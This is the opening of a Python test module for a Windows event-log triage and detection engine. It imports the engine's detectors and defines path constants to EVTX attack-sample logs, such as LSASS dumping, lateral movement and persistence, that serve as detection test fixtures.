import json
import os
import shutil
import tempfile
import unittest
from unittest import mock
from datetime import datetime, timedelta, timezone
from pathlib import Path

from correlation.entity_graph import build_entity_graph
from correlation.incident_builder import build_incidents
from detectors import behavioral, credential_access, defense_evasion, lateral_movement, persistence, powershell_script
from models.event_model import NormalizedEvent
from reporting.json_export import export_case
from triage_engine.adapters import alerts_to_signals_findings
from triage_engine.cli import main as cli_main
from triage_engine.export_sanitizer import apply_demo_redaction_data, sanitize_export_data


ROOT = Path(__file__).resolve().parents[1]
MALICIOUS_EVTX_DIR = Path(os.environ.get("TRIAGE_MALICIOUS_EVTX_DIR", r"C:\Users\oasun\Downloads\logs"))
CLEAN_EVTX_DIR = Path(os.environ.get("TRIAGE_CLEAN_EVTX_DIR", r"C:\Users\oasun\Downloads\triage-logs"))
ATTACK_SAMPLE_DIR = Path(os.environ.get("TRIAGE_ATTACK_SAMPLE_DIR", r"C:\Users\oasun\Downloads\EVTX Sample"))
SAMPLE_CACHE_DIR = ROOT / "sample_cache"
ATOMIC_REPO_SETS_DIR = SAMPLE_CACHE_DIR / "atomic_repo_sets"
DEEPBLUE_AUDIT_DIR = SAMPLE_CACHE_DIR / "deepblue_audit"
LICHTSINNIG_AUDIT_DIR = SAMPLE_CACHE_DIR / "lichtsinnig_audit"
PTH_SAMPLE = ATTACK_SAMPLE_DIR / "Lateral Movement" / "LM_4624_mimikatz_sekurlsa_pth_source_machine.evtx"
WMIEXEC_SAMPLE = ATTACK_SAMPLE_DIR / "Lateral Movement" / "LM_wmiexec_impacket_sysmon_whoami.evtx"
REMOTE_SERVICE_7045_SAMPLE = ATTACK_SAMPLE_DIR / "Lateral Movement" / "LM_Remote_Service02_7045.evtx"
COM_HIJACK_SAMPLE = ATTACK_SAMPLE_DIR / "Persistence" / "persist_turla_outlook_backdoor_comhijack.evtx"
PHISH_CREDENTIAL_PROMPT_SAMPLE = ATTACK_SAMPLE_DIR / "Credential Access" / "phish_windows_credentials_powershell_scriptblockLog_4104.evtx"
REPO_CACHE_DIR = ROOT / "repo_cache"
SBOUSSEADEN_CRED_ACCESS_DIR = REPO_CACHE_DIR / "sbousseaden_EVTX-ATTACK-SAMPLES" / "Credential Access"
LSASS_AUDIT_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "CA_hashdump_4663_4656_lsass_access.evtx"
POWERSHELL_WER_LSASS_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "Powershell_4104_MiniDumpWriteDump_Lsass.evtx"
MEMSSP_LOG_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "CA_Mimikatz_Memssp_Default_Logs_Sysmon_11.evtx"
RDRLEAKDIAG_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "sysmon_rdrleakdiag_lsass_dump.evtx"
SEKURLSA_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "sysmon_10_lsass_mimikatz_sekurlsa_logonpasswords.evtx"
COMSVCS_LSASS_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "sysmon_10_1_memdump_comsvcs_minidump.evtx"
PETITPOTAM_RPC_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "CA_PetiPotam_etw_rpc_efsr_5_6.evtx"
ZEROLOGON_RPC_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "etw_rpc_zerologon.evtx"
MACHINE_ACCOUNT_SECRET_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "Sysmon13_MachineAccount_Password_Hash_Changed_via_LsarSetSecret.evtx"
REMOTE_SAM_REGISTRY_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "remote_sam_registry_access_via_backup_operator_priv.evtx"
KERBEROS_PASSWORD_SPRAY_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "kerberos_pwd_spray_4771.evtx"
MSSQL_FAILED_LOGON_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "MSSQL_multiple_failed_logon_EventID_18456.evtx"
BROWSER_LOGONPROC_CHROME_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "CA_4624_4625_LogonType2_LogonProc_chrome.evtx"
ACL_FORCEPWD_SPNADD_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx"
SILENT_PROCESS_EXIT_LSASS_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "LsassSilentProcessExit_process_exit_monitor_3001_lsass.evtx"
NTDSUTIL_APPLOG_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "dc_applog_ntdsutil_dfir_325_326_327.evtx"
METERPRETER_HASHDUMP_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "CA_sysmon_hashdump_cmd_meterpreter.evtx"
DIRECTINPUT_KEYLOGGER_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "sysmon_13_keylogger_directx.evtx"
PROTECTED_STORAGE_RPC_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "CA_protectedstorage_5145_rpc_masterkey.evtx"
TEAMVIEWER_DUMPER_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "CA_teamviewer-dumper_sysmon_10.evtx"
KEKEO_TSSSP_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "sysmon17_18_kekeo_tsssp_default_np.evtx"
PETITPOTAM_AUDIT_FINDINGS = ROOT / "cases" / "audit-petitpotam" / "findings.json"
EVTX_TO_MITRE_LSASS_DIR = REPO_CACHE_DIR / "EVTX-to-MITRE-Attack" / "TA0006-Credential Access" / "T1003-Credential dumping"
TASKMGR_FILE_SAMPLE = EVTX_TO_MITRE_LSASS_DIR / "ID11-LSASS credentials dump via Task Manager.evtx"
TASKMGR_AUDIT_SAMPLE = EVTX_TO_MITRE_LSASS_DIR / "ID4663-Task Manager used to dump LSASS process.evtx"
PPLDUMP_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "ppl_bypass_ppldump_knowdll_hijack_sysmon_security.evtx"
PROCDUMP_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "sysmon_10_11_lsass_memdump.evtx"
DUMPERT_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "sysmon_10_11_outlfank_dumpert_and_andrewspecial_memdump.evtx"
INSTALLUTIL_SAMPLE = REPO_CACHE_DIR / "hayabusa-sample-evtx" / "YamatoSecurity" / "DefenseEvasion" / "T1218.004_SignedBinaryProxyExecutionInstallUtil_Sysmon.evtx"
DESKTOPIMGDOWNLDR_SAMPLE = REPO_CACHE_DIR / "EVTX-ATTACK-SAMPLES" / "Execution" / "sysmon_11_1_lolbas_downldr_desktopimgdownldr.evtx"
DSRM_4794_SAMPLE = SBOUSSEADEN_CRED_ACCESS_DIR / "4794_DSRM_password_change_t1098.evtx"
DSRM_NTDSUTIL_SAMPLE = REPO_CACHE_DIR / "EVTX-to-MITRE-Attack" / "TA0006-Credential Access" / "T1003-Credential dumping" / "ID4794-4688-DSRM password set with NTDSutil.evtx"
IMPACT_RECOVERY_DIR = REPO_CACHE_DIR / "EVTX-to-MITRE-Attack" / "TA0040-Impact" / "T1490-Inhibit System Recovery"
IMPACT_DATA_DIR = REPO_CACHE_DIR / "EVTX-to-MITRE-Attack" / "TA0040-Impact" / "T1565-Data manipulation"
WMI_VSS_DELETE_SAMPLE = IMPACT_RECOVERY_DIR / "ID4688-Delete VSS backup (WMI).evtx"
POWERSHELL_VSS_DELETE_SAMPLE = IMPACT_RECOVERY_DIR / "ID800-4103-4104-Delete VSS backup (PowerShell).evtx"
HOSTS_FILE_MODIFIED_SAMPLE = IMPACT_DATA_DIR / "ID11-DNS hosts files modified.evtx"
PASSWORD_POLICY_ENUM_SAMPLE = REPO_CACHE_DIR / "EVTX-to-MITRE-Attack" / "TA0007-Discovery" / "T1201-Password Policy Discovery" / "ID4661-Password policy enumeration.evtx"
WDIGEST_SAMPLE = REPO_CACHE_DIR / "EVTX-to-MITRE-Attack" / "TA0006-Credential Access" / "T1003-Credential dumping" / "ID1-12-13-Wdigest authentication activation.evtx"
VAULT_ACCESS_SAMPLE = REPO_CACHE_DIR / "EVTX-to-MITRE-Attack" / "TA0005-Defense Evasion" / "T1555.004-Windows Credential Manager" / "ID 5376, 5379, 5382, 5381, 5382 credential manager and vault.evtx"
PASSWORD_POLICY_CMD_SAMPLE = REPO_CACHE_DIR / "EVTX-to-MITRE-Attack" / "TA0007-Discovery" / "T1201-Password Policy Discovery" / "ID4688-Password policy discovery via commandline.evtx"
SERVICE_ABUSE_DIR = REPO_CACHE_DIR / "EVTX-to-MITRE-Attack" / "TA0003-Persistence" / "T1543.003-Create or Modify System Process-Windows Service"
SERVICE_FAILURE_COMMAND_SAMPLE = SERVICE_ABUSE_DIR / "ID4688-Service abuse with Failure Command.evtx"
SERVICE_FAILURE_COMMAND_POWERSHELL_SAMPLE = SERVICE_ABUSE_DIR / "ID800-4103-4104-Service abuse with Failure Command.evtx"
SERVICE_MALICIOUS_PATH_SAMPLE = SERVICE_ABUSE_DIR / "ID4688-Service abuse with malicious path.evtx"
SERVICE_MALICIOUS_PATH_POWERSHELL_SAMPLE = SERVICE_ABUSE_DIR / "ID800-4103-4104-Service abuse with malicious path.evtx"
SERVICE_CREATE_COMMAND_SAMPLE = SERVICE_ABUSE_DIR / "ID4688-Service created (command).evtx"
REMOTE_SERVICE_CREATE_COMMAND_SAMPLE = SERVICE_ABUSE_DIR / "ID4688-Command SC to create service on remote host.evtx"
OPENSSH_REMOTE_SERVICE_DIR = REPO_CACHE_DIR / "EVTX-to-MITRE-Attack" / "TA0008-Lateral Movement" / "T1021.004-Remote Service SSH"
OPENSSH_LISTEN_SAMPLE = OPENSSH_REMOTE_SERVICE_DIR / "ID4-OpenSSH server listening.evtx"
OPENSSH_ENABLE_SAMPLE = OPENSSH_REMOTE_SERVICE_DIR / "ID4103-4104-OpenSSH server activation and config.evtx"
OPENSSH_INSTALL_SAMPLE = OPENSSH_REMOTE_SERVICE_DIR / "ID4103-4104-OpenSSH server install.evtx"
DISCOVERY_DIR = REPO_CACHE_DIR / "EVTX-to-MITRE-Attack" / "TA0007-Discovery"
USER_DISCOVERY_SAMPLE = DISCOVERY_DIR / "T1087-Account discovery" / "ID4688-User enumeration via command.evtx"
GROUP_DISCOVERY_SAMPLE = DISCOVERY_DIR / "T1069-Permission Groups Discovery" / "ID4688-Group discovery via commandline.evtx"
NETWORK_SHARE_DISCOVERY_SAMPLE = DISCOVERY_DIR / "T1135.xxx-Network Share Discovery" / "ID4688-Network share discovery or connection via commandline.evtx"
DOMAIN_TRUST_DISCOVERY_SAMPLE = DISCOVERY_DIR / "T1482-Domain Trust Discovery" / "ID800,4103,4104-Active Directory Forest PowerShell class.evtx"
SPN_DISCOVERY_SAMPLE = DISCOVERY_DIR / "T1087-Account discovery" / "ID4688-List all Service Principal Names (SPN).evtx"
AUDIT_POLICY_DISCOVERY_SAMPLE = DISCOVERY_DIR / "T1016-System Network Configuration Discovery" / "ID4688-Audit policy enumerated.evtx"
FIREWALL_DISCOVERY_CMD_SAMPLE = DISCOVERY_DIR / "T1016-System Network Configuration Discovery" / "ID4688-Firewall configuration enumerated (command).evtx"
FIREWALL_DISCOVERY_POWERSHELL_SAMPLE = DISCOVERY_DIR / "T1016-System Network Configuration Discovery" / "ID800-4103-4104-Firewall configuration enumerated (PowerShell).evtx"
SCHEDULED_TASK_DISCOVERY_SAMPLE = DISCOVERY_DIR / "T1016-System Network Configuration Discovery" / "ID4688-Scheduled task configuration enumeration.evtx"
DNS_ZONE_TRANSFER_SAMPLE = DISCOVERY_DIR / "T1016-System Network Configuration Discovery" / "ID6004-DNS-server-failed zone transfer.evtx"
REMOTE_HOSTS_FILE_DISCOVERY_SAMPLE = DISCOVERY_DIR / "T1018-Remote System Discovery" / "ID5145-DNS hosts files access via network share.evtx"
ANONYMOUS_SMB_PROBE_SAMPLE = DISCOVERY_DIR / "T1046-Network Service Scanning" / "ID4624-Anonymous login with domain specified (DonPapi).evtx"
SBOUSSEADEN_DISCOVERY_DIR = REPO_CACHE_DIR / "EVTX-ATTACK-SAMPLES" / "Discovery"
PSLOGGEDON_DISCOVERY_SAMPLE = SBOUSSEADEN_DISCOVERY_DIR / "discovery_psloggedon.evtx"
BLOODHOUND_DISCOVERY_SAMPLE = SBOUSSEADEN_DISCOVERY_DIR / "discovery_bloodhound.evtx"
LOCAL_USER_GROUP_DISCOVERY_SAMPLE = SBOUSSEADEN_DISCOVERY_DIR / "discovery_local_user_or_group_windows_security_4799_4798.evtx"
SBOUSSEADEN_LATERAL_DIR = REPO_CACHE_DIR / "EVTX-ATTACK-SAMPLES" / "Lateral Movement"
NEW_SMB_SHARE_SAMPLE = SBOUSSEADEN_LATERAL_DIR / "LM_NewShare_Added_Sysmon_12_13.evtx"
DCOM_FAILED_10016_SAMPLE = REPO_CACHE_DIR / "sbousseaden_EVTX-ATTACK-SAMPLES" / "Lateral Movement" / "LM_dcom_shwnd_shbrwnd_mmc20_failed_traces_system_10016.evtx"
DFIR_RDPSHARP_168_SAMPLE = REPO_CACHE_DIR / "sbousseaden_EVTX-ATTACK-SAMPLES" / "Lateral Movement" / "dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx"
REMOTE_SVCCTL_PIPE_SAMPLE = SBOUSSEADEN_LATERAL_DIR / "LM_Remote_Service01_5145_svcctl.evtx"
REMCOM_PIPE_SAMPLE = SBOUSSEADEN_LATERAL_DIR / "LM_REMCOM_5145_TargetHost.evtx"
SPOOLESS_PIPE_SAMPLE = SBOUSSEADEN_LATERAL_DIR / "spoolsample_5145.evtx"
RENAMED_PSEXEC_PIPE_SAMPLE = SBOUSSEADEN_LATERAL_DIR / "LM_renamed_psexecsvc_5145.evtx"
REMOTE_FILE_COPY_SAMPLE = SBOUSSEADEN_LATERAL_DIR / "LM_5145_Remote_FileCopy.evtx"
REMOTE_FILE_WRITE_SYSMON_SAMPLE = SBOUSSEADEN_LATERAL_DIR / "remote_file_copy_system_proc_file_write_sysmon_11.evtx"
SBOUSSEADEN_C2_DIR = REPO_CACHE_DIR / "EVTX-ATTACK-SAMPLES" / "Command and Control"
BITS_OPENVPN_SAMPLE = REPO_CACHE_DIR / "sbousseaden_EVTX-ATTACK-SAMPLES" / "Command and Control" / "bits_openvpn.evtx"
PLINK_RDP_TUNNEL_SAMPLE = SBOUSSEADEN_C2_DIR / "DE_RDP_Tunnel_5156.evtx"
SYSMON_RDP_TUNNEL_SAMPLE = SBOUSSEADEN_C2_DIR / "DE_sysmon-3-rdp-tun.evtx"
IIS_TUNNEL_SAMPLE = SBOUSSEADEN_C2_DIR / "tunna_iis_rdp_smb_tunneling_sysmon_3.evtx"
RDP_AUTH_1149_SAMPLE = SBOUSSEADEN_C2_DIR / "DE_RDP_Tunneling_TerminalServices-RemoteConnectionManagerOperational_1149.evtx"
RDP_LOOPBACK_4624_SAMPLE = SBOUSSEADEN_C2_DIR / "DE_RDP_Tunneling_4624.evtx"
SBOUSSEADEN_DEFENSE_EVASION_DIR = REPO_CACHE_DIR / "sbousseaden_EVTX-ATTACK-SAMPLES" / "Defense Evasion"
NETSH_PORTPROXY_RDP_SAMPLE = SBOUSSEADEN_DEFENSE_EVASION_DIR / "de_portforward_netsh_rdp_sysmon_13_1.evtx"
UNMANAGED_POWERSHELL_PSINJECT_SAMPLE = SBOUSSEADEN_DEFENSE_EVASION_DIR / "de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx"
RUNDLL32_WERMGR_HOLLOWING_SAMPLE = REPO_CACHE_DIR / "sbousseaden_EVTX-ATTACK-SAMPLES" / "AutomatedTestingTools" / "Malware" / "rundll32_hollowing_wermgr_masquerading.evtx"
CLM_DISABLED_SAMPLE = SBOUSSEADEN_DEFENSE_EVASION_DIR / "DE_Powershell_CLM_Disabled_Sysmon_12.evtx"
SCRIPTBLOCKLOGGING_DISABLED_SAMPLE = SBOUSSEADEN_DEFENSE_EVASION_DIR / "de_PsScriptBlockLogging_disabled_sysmon12_13.evtx"
EXEC_POLICY_CHANGED_SAMPLE = SBOUSSEADEN_DEFENSE_EVASION_DIR / "de_powershell_execpolicy_changed_sysmon_13.evtx"
EVENTLOG_CRASH_SAMPLE = SBOUSSEADEN_DEFENSE_EVASION_DIR / "DE_EventLog_Service_Crashed.evtx"
REMOTE_EVENTLOG_CRASH_SAMPLE = SBOUSSEADEN_DEFENSE_EVASION_DIR / "DE_remote_eventlog_svc_crash_byt3bl33d3r_sysmon_17_1_3.evtx"
EVENTLOG_7036_SAMPLE = SBOUSSEADEN_DEFENSE_EVASION_DIR / "DE_WinEventLogSvc_Crash_System_7036.evtx"
XPCMDSHELL_ENABLED_SAMPLE = SBOUSSEADEN_DEFENSE_EVASION_DIR / "DE_xp_cmdshell_enabled_MSSQL_EID_15457.evtx"
XPCMDSHELL_EVENTS_SAMPLE = SBOUSSEADEN_LATERAL_DIR / "LM_xp_cmdshell_MSSQL_Events.evtx"
XPCMDSHELL_EVENTS_SBOUSSEADEN_SAMPLE = REPO_CACHE_DIR / "sbousseaden_EVTX-ATTACK-SAMPLES" / "Lateral Movement" / "LM_xp_cmdshell_MSSQL_Events.evtx"
XPCMDSHELL_ATTEMPT_SAMPLE = SBOUSSEADEN_LATERAL_DIR / "MSSQL_15281_xp_cmdshell_exec_failed_attempt.evtx"
XPCMDSHELL_ATTEMPT_SBOUSSEADEN_SAMPLE = REPO_CACHE_DIR / "sbousseaden_EVTX-ATTACK-SAMPLES" / "Lateral Movement" / "MSSQL_15281_xp_cmdshell_exec_failed_attempt.evtx"
WINRM_POORLOG_SAMPLE = REPO_CACHE_DIR / "sbousseaden_EVTX-ATTACK-SAMPLES" / "Lateral Movement" / "LM_winrm_target_wrmlogs_91_wsmanShellStarted_poorLog.evtx"
WINDOWS_DEFENDER_EVENTS_SAMPLE = REPO_CACHE_DIR / "sbousseaden_EVTX-ATTACK-SAMPLES" / "AutomatedTestingTools" / "WinDefender_Events_1117_1116_AtomicRedTeam.evtx"
KRBRELAYUP_LOOPBACK_SAMPLE = REPO_CACHE_DIR / "sbousseaden_EVTX-ATTACK-SAMPLES" / "Privilege Escalation" / "privesc_KrbRelayUp_windows_4624.evtx"
ACCOUNT_MANIPULATION_DIR = REPO_CACHE_DIR / "EVTX-to-MITRE-Attack" / "TA0003-Persistence" / "T1098.xxx-Account manipulation"
PASSWORD_CHANGE_NTLM_SAMPLE = ACCOUNT_MANIPULATION_DIR / "ID4723-5145-password reset with changeNTLM (Mimikatz).evtx"
PASSWORD_NOT_REQUIRED_SAMPLE = ACCOUNT_MANIPULATION_DIR / "ID4738-Account with password not required.evtx"
PASSWORD_NEVER_EXPIRES_SAMPLE = ACCOUNT_MANIPULATION_DIR / "ID4738-Password never expires.evtx"
PASSWORD_CANNOT_CHANGE_SAMPLE = ACCOUNT_MANIPULATION_DIR / "ID4738-Password cannot be changed.evtx"
ACCOUNT_NOT_DELEGATABLE_SAMPLE = ACCOUNT_MANIPULATION_DIR / "ID4738-Account is sensitive and cannot be delegated.evtx"
PREAUTH_DISABLED_SAMPLE = ACCOUNT_MANIPULATION_DIR / "ID4738-Do not require Kerberos preauthentication.evtx"
DES_ONLY_SAMPLE = ACCOUNT_MANIPULATION_DIR / "ID4738-Use only Kerberos DES encryption types.evtx"
REVERSIBLE_PASSWORD_SAMPLE = ACCOUNT_MANIPULATION_DIR / "ID4738-User set with reversible psw encryption.evtx"
USER_RENAME_ADMIN_SAMPLE = ACCOUNT_MANIPULATION_DIR / "ID4781-4738-User renamed to admin or likely.evtx"
COMPUTER_RENAME_NO_DOLLAR_SAMPLE = ACCOUNT_MANIPULATION_DIR / "ID4781-Computer account renamed without a trailing $ (CVE-2021-42278).evtx"
SAMACCOUNT_SPOOFING_SAMPLE = (
    REPO_CACHE_DIR
    / "sbousseaden_EVTX-ATTACK-SAMPLES"
    / "Privilege Escalation"
    / "samaccount_spoofing_CVE-2021-42287_CVE-2021-42278_DC_securitylogs.evtx"
)
SQL_DATABASE_ROLE_SAMPLE = ACCOUNT_MANIPULATION_DIR / "ID33205-SQL Server member added to database role.evtx"
SQL_SERVER_ROLE_SAMPLE = ACCOUNT_MANIPULATION_DIR / "ID33205-SQL Server member added to server role.evtx"
SQL_USER_LINK_SAMPLE = ACCOUNT_MANIPULATION_DIR / "ID33205-SQL Server user linked to a database.evtx"
MASS_GROUP_CHANGE_SAMPLE = ACCOUNT_MANIPULATION_DIR / "ID4728-Massive account group membership change.evtx"
SELF_ADD_GROUP_SAMPLE = ACCOUNT_MANIPULATION_DIR / "ID4728-Member adding to a group by the same account.evtx"
EXCHANGE_ADMIN_GROUP_SAMPLE = ACCOUNT_MANIPULATION_DIR / "ID4756-Exchange admin group change.evtx"
SPN_PROCESS_SAMPLE = ACCOUNT_MANIPULATION_DIR / "ID4688-SPN added to an account.evtx"
UNCONSTRAINED_DELEGATION_SAMPLE = ACCOUNT_MANIPULATION_DIR / "ID4742,5136-Enable Trust this computer for delegation (to any service, Kerberos only).evtx"
RUNAS_SAMPLE = SAMPLE_CACHE_DIR / "mitre_runas_diff_user.evtx"
TOKEN_SAMPLE = SAMPLE_CACHE_DIR / "hayabusa_token_manip.evtx"
ATEXEC_SAMPLE = SAMPLE_CACHE_DIR / "mitre_atexec_susp.evtx"
SMBEXEC_SAMPLE = SAMPLE_CACHE_DIR / "mitre_smbexec_service.evtx"
PSEXEC_NATIVE_SECURITY_SAMPLE = SAMPLE_CACHE_DIR / "hayabusa_psexec_native_target_security.evtx"
PSEXEC_NATIVE_SYSTEM_SAMPLE = SAMPLE_CACHE_DIR / "hayabusa_psexec_native_target_system.evtx"
PSEXEC_POWERSHELL_SECURITY_SAMPLE = SAMPLE_CACHE_DIR / "hayabusa_psexec_powershell_target_security.evtx"
DCSYNC_SAMPLE = SAMPLE_CACHE_DIR / "hayabusa_dcsync_4662.evtx"
NEW_USER_SAMPLE = SAMPLE_CACHE_DIR / "hayabusa_new_user_security.evtx"
LOCAL_ADMIN_SAMPLE = SAMPLE_CACHE_DIR / "mitre_user_added_local_admin.evtx"
WINRM_SAMPLE = SAMPLE_CACHE_DIR / "hayabusa_winrm.evtx"
SCHEDTASK_SAMPLE = SAMPLE_CACHE_DIR / "mitre_schedtask.evtx"
HIDDEN_LOCAL_ACCOUNT_SAMPLE = SAMPLE_CACHE_DIR / "evtx_hidden_local_account_sysmon.evtx"
ATOMIC_HIDDEN_USER_DOLLAR_SAMPLE = SAMPLE_CACHE_DIR / "atomic_hidden_user_dollar_sysmon.evtx"
ATOMIC_HIDDEN_USER_REGISTRY_SAMPLE = SAMPLE_CACHE_DIR / "atomic_hidden_user_registry_sysmon.evtx"
GUEST_ADMINS_SAMPLE = SAMPLE_CACHE_DIR / "evtx_guest_added_to_admins_4732.evtx"
QUICK_LOCAL_GROUP_CHURN_SAMPLE = SAMPLE_CACHE_DIR / "mitre_quick_local_group_churn.evtx"
LOCAL_SAM_ADMIN_SAMPLE = Path(
    os.environ.get(
        "TRIAGE_LOCAL_SAM_ADMIN_SAMPLE",
        r"C:\Users\oasun\Downloads\EVTX Sample\Persistence\sysmon_local_account_creation_and_added_admingroup_12_13.evtx",
    )
)
DEEPBLUE_EVENTLOG_SAMPLE = DEEPBLUE_AUDIT_DIR / "disablestop-eventlog.evtx"
DEEPBLUE_MIMIKATZ_SAMPLE = DEEPBLUE_AUDIT_DIR / "mimikatz-privesc-hashdump.evtx"
DEEPBLUE_PASSWORD_SPRAY_SAMPLE = DEEPBLUE_AUDIT_DIR / "password-spray.evtx"
DEEPBLUE_WMI_PERSIST_SAMPLE = DEEPBLUE_AUDIT_DIR / "wmi-event-filter-persistance.evtx"
DEEPBLUE_PSATTACK_SAMPLE = DEEPBLUE_AUDIT_DIR / "psattack-security.evtx"
DEEPBLUE_OBF_PS_SAMPLE = DEEPBLUE_AUDIT_DIR / "Powershell-Invoke-Obfuscation-encoding-menu.evtx"
LICHTSINNIG_ACCESSIBILITY_SAMPLE = LICHTSINNIG_AUDIT_DIR / "persistence_accessibility_features_osk_sysmon1.evtx"
LICHTSINNIG_APPFIX_SAMPLE = LICHTSINNIG_AUDIT_DIR / "persistence_sysmon_11_13_1_shime_appfix.evtx"
LICHTSINNIG_DCSHADOW_SAMPLE = LICHTSINNIG_AUDIT_DIR / "persistence_security_dcshadow_4742.evtx"
HAYABUSA_OBF_PS_SAMPLE = SAMPLE_CACHE_DIR / "hayabusa_obf_ps.evtx"
HAYABUSA_ASREP_SAMPLE = SAMPLE_CACHE_DIR / "hayabusa_asrep_security.evtx"
MITRE_RBCD_SAMPLE = SAMPLE_CACHE_DIR / "mitre_rbcd_delegation.evtx"
MITRE_GPO_SAMPLE = SAMPLE_CACHE_DIR / "mitre_sensitive_gpo.evtx"
MITRE_PASSWORD_RESET_SAMPLE = SAMPLE_CACHE_DIR / "mitre_privileged_password_reset.evtx"
MITRE_GOLDEN_TICKET_SAMPLE = SAMPLE_CACHE_DIR / "mitre_golden_ticket_issued.evtx"
MITRE_ADMINSDHOLDER_PERM_SAMPLE = SAMPLE_CACHE_DIR / "mitre_adminsdholder_permissions.evtx"
MITRE_ADMINSDHOLDER_OBF_SAMPLE = SAMPLE_CACHE_DIR / "mitre_adminsdholder_obfuscation.evtx"
MITRE_SPN_USER_SAMPLE = SAMPLE_CACHE_DIR / "mitre_spn_user_account.evtx"
MITRE_SPN_COMPUTER_SAMPLE = SAMPLE_CACHE_DIR / "mitre_spn_computer_account.evtx"
MITRE_AD_OBJECT_OWNER_SAMPLE = SAMPLE_CACHE_DIR / "mitre_ad_object_owner_changed.evtx"
MITRE_ADCS_OCSP_SAMPLE = SAMPLE_CACHE_DIR / "mitre_adcs_pki_ocsp.evtx"
LICHTSINNIG_IIS_WEBSHELL_SAMPLE = SAMPLE_CACHE_DIR / "LM_typical_IIS_webshell_sysmon_1_10_traces.evtx"
LICHTSINNIG_DCOM_IE_SAMPLE = SAMPLE_CACHE_DIR / "LM_dcom_InternetExplorer.Application_sysmon_1.evtx"
LICHTSINNIG_LETHALHTA_SAMPLE = SAMPLE_CACHE_DIR / "LM_DCOM_MSHTA_LethalHTA_Sysmon_3_1.evtx"
HAYABUSA_DCOM_MSHTA_SAMPLE = SAMPLE_CACHE_DIR / "hayabusa_dcom_mshta.evtx"
HAYABUSA_RUNDLL32_OPENURL_SAMPLE = SAMPLE_CACHE_DIR / "hayabusa_rundll32_openurl.evtx"
LICHTSINNIG_MSIPACKAGE_SAMPLE = SAMPLE_CACHE_DIR / "Exec_sysmon_meterpreter_reversetcp_msipackage.evtx"
LICHTSINNIG_KEEPASS_SAMPLE = SAMPLE_CACHE_DIR / "CA_keepass_KeeThief_Get-KeePassDatabaseKey.evtx"
MITRE_PRINTNIGHTMARE_SAMPLE = SAMPLE_CACHE_DIR / "mitre_printnightmare_cmd.evtx"
LICHTSINNIG_ROTTEN_POTATO_SAMPLE = SAMPLE_CACHE_DIR / "privesc_rotten_potato_from_webshell_metasploit_sysmon_1_8_3.evtx"
EFSPOTATO_SAMPLE = REPO_CACHE_DIR / "sbousseaden_EVTX-ATTACK-SAMPLES" / "Privilege Escalation" / "EfsPotato_sysmon_17_18_privesc_seimpersonate_to_system.evtx"
ROGUEPOTATO_SAMPLE = REPO_CACHE_DIR / "sbousseaden_EVTX-ATTACK-SAMPLES" / "Privilege Escalation" / "privesc_roguepotato_sysmon_17_18.evtx"
USCHEDULER_CVE_SAMPLE = (
    REPO_CACHE_DIR
    / "sbousseaden_EVTX-ATTACK-SAMPLES"
    / "Privilege Escalation"
    / "PrivEsc_CVE-2020-1313_Sysmon_13_UScheduler_Cmdline.evtx"
)
RENAMED_PSEXEC_SERVICE_SAMPLE = (
    REPO_CACHE_DIR
    / "sbousseaden_EVTX-ATTACK-SAMPLES"
    / "Defense Evasion"
    / "DE_renamed_psexec_service_sysmon_17_18.evtx"
)
METERPRETER_NAMEDPIPE_GETSYSTEM_SAMPLE = (
    REPO_CACHE_DIR
    / "sbousseaden_EVTX-ATTACK-SAMPLES"
    / "Privilege Escalation"
    / "sysmon_13_1_meterpreter_getsystem_NamedPipeImpersonation.evtx"
)
LICHTSINNIG_FTP_EXEC_SAMPLE = SAMPLE_CACHE_DIR / "exec_sysmon_1_ftp.evtx"
LICHTSINNIG_ACCESSVBOM_SAMPLE = SAMPLE_CACHE_DIR / "de_sysmon_13_VBA_Security_AccessVBOM.evtx"
LICHTSINNIG_SCHEDTASK_SYSTEM_SAMPLE = SAMPLE_CACHE_DIR / "sysmon_1_11_exec_as_system_via_schedtask.evtx"
LICHTSINNIG_RUNDLL32_MSHTA_TASK_SAMPLE = SAMPLE_CACHE_DIR / "exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.evtx"
LICHTSINNIG_WMI_CMD_CONSUMER_SAMPLE = SAMPLE_CACHE_DIR / "sysmon_20_21_1_CommandLineEventConsumer.evtx"
LICHTSINNIG_WMIGHOST_SAMPLE = SAMPLE_CACHE_DIR / "wmighost_sysmon_20_21_1.evtx"
LICHTSINNIG_UAC_SDCLT_SAMPLE = SAMPLE_CACHE_DIR / "Sysmon_13_1_UACBypass_SDCLTBypass.evtx"
LICHTSINNIG_UAC_EVENTVWR_SAMPLE = SAMPLE_CACHE_DIR / "Sysmon_13_1_UAC_Bypass_EventVwrBypass.evtx"
LICHTSINNIG_TSCLIENT_SAMPLE = SAMPLE_CACHE_DIR / "LM_tsclient_startup_folder.evtx"
LICHTSINNIG_BROWSER_CRED_SAMPLE = SAMPLE_CACHE_DIR / "CA_chrome_firefox_opera_4663.evtx"
